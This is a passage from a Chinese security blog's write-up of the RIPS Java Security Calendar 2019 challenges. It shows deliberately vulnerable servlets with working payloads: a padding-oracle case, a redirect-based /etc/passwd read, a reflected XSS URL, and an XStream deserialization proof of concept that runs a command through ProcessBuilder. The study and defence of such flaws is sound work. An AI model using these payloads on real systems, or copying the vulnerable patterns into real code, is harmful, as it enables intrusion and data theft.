class="number">16</span>];</span><br><span class="line">    System.arraycopy(cipher, <span class="number">0</span>, iv, <span class="number">0</span>, iv.length);</span><br><span class="line">    IvParameterSpec ivParameterSpec = <span class="keyword">new</span> IvParameterSpec(iv);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">byte</span>[] encryptedBytes = <span class="keyword">new</span> <span class="keyword">byte</span>[cipher.length - <span class="number">16</span>];</span><br><span class="line">    System.arraycopy(cipher, <span class="number">16</span>, encryptedBytes, <span class="number">0</span>, cipher.length - <span class="number">16</span>);</span><br><span class="line">    SecretKeyFactory factory = SecretKeyFactory.getInstance(<span class="string">"PBKDF2WithHmacSHA256"</span>);</span><br><span class="line">    <span class="comment">// Of course the password is not known by the attacker - just for testing purposes</span></span><br><span class="line">    KeySpec spec = <span class="keyword">new</span> PBEKeySpec(<span class="string">"SuperSecurePassword"</span>.toCharArray(), salt, <span class="number">65536</span>, <span class="number">128</span>);</span><br><span class="line">    SecretKey key = factory.generateSecret(spec);</span><br><span class="line">    SecretKeySpec secretKeySpec = <span class="keyword">new</span> SecretKeySpec(key.getEncoded(), <span class="string">"AES"</span>);</span><br><span class="line">    <span class="comment">// Decrypt.</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      Cipher cipherDecrypt = Cipher.getInstance(<span class="string">"AES/CBC/PKCS5Padding"</span>);</span><br><span class="line">      cipherDecrypt.init(Cipher.DECRYPT_MODE, secretKeySpec, ivParameterSpec);</span><br><span class="line">      <span class="keyword">byte</span>[] decrypted = cipherDecrypt.doFinal(encryptedBytes);</span><br><span class="line">      <span class="comment">// Do something.</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (BadPaddingException e) &#123;</span><br><span class="line">      res.getWriter().println(<span class="string">"Invalid Padding!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>AES/CBC存在padding oracle问题。网上又很多详细的文章了，不再缀诉。</p>
<h3 id="防御措施-14"><a href="#防御措施-14" class="headerlink" title="防御措施"></a>防御措施</h3><p>TODO</p>
<h2 id="Day-22-Fruitcake"><a href="#Day-22-Fruitcake" class="headerlink" title="Day 22 - Fruitcake"></a>Day 22 - Fruitcake</h2><h3 id="Source-20"><a href="#Source-20" class="headerlink" title="Source"></a>Source</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReadExternalUrl</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> URLConnection <span class="title">getUrl</span><span class="params">(String target)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">      <span class="comment">// Don't allow redirects:</span></span><br><span class="line">      HttpURLConnection.setFollowRedirects(<span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">      URL url = <span class="keyword">new</span> URL(target);</span><br><span class="line">      <span class="keyword">if</span>(!url.getProtocol().startsWith(<span class="string">"http"</span>))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"Must start with http!."</span>);</span><br><span class="line"></span><br><span class="line">      InetAddress inetAddress = InetAddress.getByName(url.getHost());</span><br><span class="line">      <span class="keyword">if</span> (inetAddress.isAnyLocalAddress() || inetAddress.isLoopbackAddress() || inetAddress.isLinkLocalAddress())</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"No local urls allowed!"</span>);</span><br><span class="line"></span><br><span class="line">      HttpURLConnection conn = (HttpURLConnection) url.openConnection();</span><br><span class="line">      <span class="keyword">return</span> conn;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">                       HttpServletResponse response)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">      URLConnection conn = getUrl(request.getParameter(<span class="string">"url"</span>));</span><br><span class="line">      conn.connect();</span><br><span class="line">      String redirect = conn.getHeaderField(<span class="string">"Location"</span>);</span><br><span class="line">      <span class="keyword">if</span>(redirect != <span class="keyword">null</span>) &#123;</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(redirect);</span><br><span class="line">        <span class="keyword">if</span>(redirect.indexOf(<span class="string">"http://"</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"No http found!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(getUrl(redirect.substring(redirect.indexOf(<span class="string">"http://"</span>))) != <span class="keyword">null</span>) &#123;</span><br><span class="line">          conn = url.openConnection();</span><br><span class="line">          conn.connect();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// Output content of url</span></span><br><span class="line">      IOUtils.copy(conn.getInputStream(),response.getOutputStream());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      System.exit(-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里存在一个漏洞可以读文件,虽然url参数必须以http开始，但是最总读读数据的是来自Location的，然而Location攻击者是可以控制的。<br>?url=<a href="http://www.google.com" target="_blank" rel="noopener">http://www.google.com</a><br>Location:file:///etc/passwd#<a href="http://xxx.com" target="_blank" rel="noopener">http://xxx.com</a></p>
<h3 id="防御措施-15"><a href="#防御措施-15" class="headerlink" title="防御措施"></a>防御措施</h3><p>保持一致性，redirect也要检查。不能检查一个参数，但是实际使用的是另一个参数。</p>
<h2 id="Day-23-Ivy"><a href="#Day-23-Ivy" class="headerlink" title="Day 23 - Ivy"></a>Day 23 - Ivy</h2><h3 id="Source-21"><a href="#Source-21" class="headerlink" title="Source"></a>Source</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.text.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.StringEscapeUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ShowCalendar</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      response.setContentType(<span class="string">"text/html"</span>);</span><br><span class="line">      GregorianCalendar calendar = <span class="keyword">new</span> GregorianCalendar();</span><br><span class="line">      SimpleTimeZone x = <span class="keyword">new</span> SimpleTimeZone(<span class="number">0</span>, request.getParameter(<span class="string">"id"</span>));</span><br><span class="line">      SimpleDateFormat parser=<span class="keyword">new</span> SimpleDateFormat(<span class="string">"EEE MMM d HH:mm:ss zzz yyyy"</span>);</span><br><span class="line">      calendar.setTime(parser.parse(request.getParameter(<span class="string">"current_time"</span>)));</span><br><span class="line">      calendar.setTimeZone(x);</span><br><span class="line">      Formatter formatter = <span class="keyword">new</span> Formatter();</span><br><span class="line">      String name = StringEscapeUtils.escapeHtml4(request.getParameter(<span class="string">"name"</span>));</span><br><span class="line">      formatter.format(<span class="string">"Name of your calendar: "</span> + name + <span class="string">" and your current date is: %1$te.%1$tm.%1$tY"</span>, calendar);</span><br><span class="line">      PrintWriter pw = response.getWriter();</span><br><span class="line">      pw.print(formatter.toString());</span><br><span class="line">    &#125; <span class="keyword">catch</span>(ParseException e) &#123;</span><br><span class="line">      response.sendRedirect(<span class="string">"/"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>很典型的反射xss.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://victim.org/?id=&lt;script&gt;alert(1)&lt;/script&gt;&amp;current_time=Thu Jun 18 20:56:02 EDT 2009&amp;name=%shello</span><br></pre></td></tr></table></figure></p>
<h2 id="Day-24-Nutcracker"><a href="#Day-24-Nutcracker" class="headerlink" title="Day 24 - Nutcracker"></a>Day 24 - Nutcracker</h2><h3 id="Source-22"><a href="#Source-22" class="headerlink" title="Source"></a>Source</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.rips.demo.web;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Invoker</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">private</span> String c;</span><br><span class="line">  <span class="keyword">private</span> String m;</span><br><span class="line">  <span class="keyword">private</span> String[] a;</span><br><span class="line"> </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Invoker</span><span class="params">(String c, String m, String[] a)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.c = c;</span><br><span class="line">    <span class="keyword">this</span>.m = m;</span><br><span class="line">    <span class="keyword">this</span>.a = a;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InstantiationException, InvocationTargetException </span>&#123;</span><br><span class="line">    ois.defaultReadObject();</span><br><span class="line">    Class clazz = Class.forName(<span class="keyword">this</span>.c);</span><br><span class="line">    Object obj = clazz.getConstructor(String[].class).newInstance(<span class="keyword">new</span> Object[]&#123;<span class="keyword">this</span>.a&#125;);</span><br><span class="line">    Method meth = clazz.getMethod(<span class="keyword">this</span>.m);</span><br><span class="line">    meth.invoke(obj, <span class="keyword">null</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> String name;</span><br><span class="line">  <span class="keyword">private</span> String email;</span><br><span class="line">  <span class="keyword">transient</span> <span class="keyword">private</span> String password;</span><br><span class="line"> </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">(String name, String email, String password)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">    <span class="keyword">this</span>.email = email;</span><br><span class="line">    <span class="keyword">this</span>.password = password;</span><br><span class="line">  &#125;</span><br><span class="line">   </span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream stream)</span></span></span><br><span class="line"><span class="function">      <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    stream.defaultReadObject();</span><br><span class="line">    password = (String) stream.readObject();</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"User&#123;"</span> + <span class="string">"name='"</span> + name + <span class="string">", email='"</span> + email + <span class="string">"'&#125;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(value = <span class="string">"/unserialize"</span>, consumes = <span class="string">"text/xml"</span>)</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">unserialize</span><span class="params">(@RequestBody String xml, HttpServletResponse res)</span> <span class="keyword">throws</span> IOException, ParserConfigurationException, SAXException, XPathExpressionException, TransformerException </span>&#123;</span><br><span class="line">    res.setContentType(<span class="string">"text/plain"</span>);</span><br><span class="line">    <span class="comment">// Parse xml string</span></span><br><span class="line">    DocumentBuilderFactory builderFactory = DocumentBuilderFactory.newInstance();</span><br><span class="line">    builderFactory.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>,<span class="keyword">true</span>);</span><br><span class="line">    DocumentBuilder builder = builderFactory.newDocumentBuilder();</span><br><span class="line">    Document xmlDocument = builder.parse(<span class="keyword">new</span> InputSource(<span class="keyword">new</span> StringReader(xml)));</span><br><span class="line">    XPath xPath = XPathFactory.newInstance().newXPath();</span><br><span class="line">    String expression = <span class="string">"//com.rips.demo.web.User[@serialization='custom'][1]"</span>;</span><br><span class="line">    <span class="comment">//only allow User objects to be unserialized!!!</span></span><br><span class="line">    NodeList nodeList = (NodeList) xPath.compile(expression).evaluate(xmlDocument, XPathConstants.NODESET);</span><br><span class="line">    <span class="comment">// Transform node back to xml string</span></span><br><span class="line">    Transformer transformer = TransformerFactory.newInstance().newTransformer();</span><br><span class="line">    transformer.setOutputProperty(OutputKeys.OMIT_XML_DECLARATION, <span class="string">"yes"</span>);</span><br><span class="line">    StringWriter writer = <span class="keyword">new</span> StringWriter();</span><br><span class="line">    transformer.transform(<span class="keyword">new</span> DOMSource(nodeList.item(<span class="number">0</span>)), <span class="keyword">new</span> StreamResult(writer));</span><br><span class="line">    String xmloutput = writer.getBuffer().toString();</span><br><span class="line">    <span class="comment">// Unserialze User</span></span><br><span class="line">    User user = (User) <span class="keyword">new</span> XStream().fromXML(xmloutput);</span><br><span class="line">    res.getWriter().print(<span class="string">"Successfully unserialized "</span>+user.toString());</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>这里存在一个对象注入 然后反序列化造成命令执行。User对象是本来程序准备反序列化的，但是恶意的xml里还包含里Invoker对象,Invoker对象反序列化，造成代码执行。<br>poc<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">com.company.User</span> <span class="attr">serialization</span>=<span class="string">"custom"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">com.company.User</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">email</span>&gt;</span>peter@gmail.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">name</span>&gt;</span>Peter<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">com.company.Invoker</span> <span class="attr">serialization</span>=<span class="string">"custom"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">com.company.Invoker</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">string</span>&gt;</span>touch<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">string</span>&gt;</span>/tmp/xstream.txt<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">c</span>&gt;</span>java.lang.ProcessBuilder<span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m</span>&gt;</span>start<span class="tag">&lt;/<span class="name">m</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">com.company.Invoker</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">com.company.Invoker</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">com.company.User</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">com.company.User</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h3 id="防御措施-16"><a href="#防御措施-16" class="headerlink" title="防御措施"></a>防御措施</h3><p>升级XStream.</p>
<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><ol>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener">https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html</a></li>
<li><a href="https://www.ripstech.com/java-security-calendar-2019/" target="_blank" rel="noopener">https://www.ripstech.com/java-security-calendar-2019/</a></li>
<li><a href="https://www.zhaidehui.com/index.php/archives/327/" target="_blank" rel="noopener">https://www.zhaidehui.com/index.php/archives/327/</a></li>
<li><a href="https://www.anquanke.com/post/id/180932" target="_blank" rel="noopener">https://www.anquanke.com/post/id/180932</a></li>
<li><a href="https://stackoverflow.com/questions/37203247/while-loading-jni-library-how-the-mapping-happens-with-the-actual-library-name" target="_blank" rel="noopener">https://stackoverflow.com/questions/37203247/while-loading-jni-library-how-the-mapping-happens-with-the-actual-library-name</a></li>
<li><a href="https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html" target="_blank" rel="noopener">https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html</a></li>
</ol>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/05/JavaSecCalendar2019-Writeup/" data-id="ck7zimyz8000258u4qitdz1yr" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
  
    <a href="/2019/11/26/Solr-Rce-Velocity/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">Solr_Rce_Velocity学习</div>
    </a>
  
</nav>

  
</article>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Windows/">Windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/加密/">加密</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/后门/">后门</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/Windows/" style="font-size: 20px;">Windows</a> <a href="/tags/加密/" style="font-size: 10px;">加密</a> <a href="/tags/后门/" style="font-size: 10px;">后门</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">June 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">April 2018</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/01/05/JavaSecCalendar2019-Writeup/">JavaSecCalendar2019-Writeup学习</a>
          </li>
        
          <li>
            <a href="/2019/11/26/Solr-Rce-Velocity/">Solr_Rce_Velocity学习</a>
          </li>
        
          <li>
            <a href="/2018/10/14/hello-world/">Hello World</a>
          </li>
        
          <li>
            <a href="/2018/06/28/关机就安全了吗/">关机就安全了吗</a>
          </li>
        
          <li>
            <a href="/2018/05/15/穿透Windows防火墙唤醒后门/">穿透Windows防火墙唤醒后门</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 Trace<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>



  </div>
</body>
</html>